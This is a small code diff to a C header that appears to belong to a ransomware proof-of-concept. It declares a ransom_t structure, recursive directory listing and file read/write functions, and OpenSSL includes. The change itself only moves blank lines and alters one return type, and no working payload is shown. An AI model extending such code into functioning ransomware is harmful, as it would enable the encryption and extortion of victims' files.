@@ -6,6 +6,7 @@
   * #include "openssl/include/openssl/blowfish.h"
  **/
 #include "openssl/include/openssl/pem.h"
+
 #include <dirent.h>
 #include <limits.h>
 #include <signal.h>
@@ -13,10 +14,8 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-
 #include <sys/utsname.h>
 #include <unistd.h>
-
 
 #define BUFSIZE 1024
 
@@ -75,7 +74,7 @@ void *recalloc(void *ptr, size_t old_size, size_t new_size);
 
 /* OS functions */
 node_t *recurse_ls(char *filename, ransom_t *ransom);
-size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
+char *read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
 size_t write_file(node_t *node, char *buffer);
 
 /* Base64 POC */
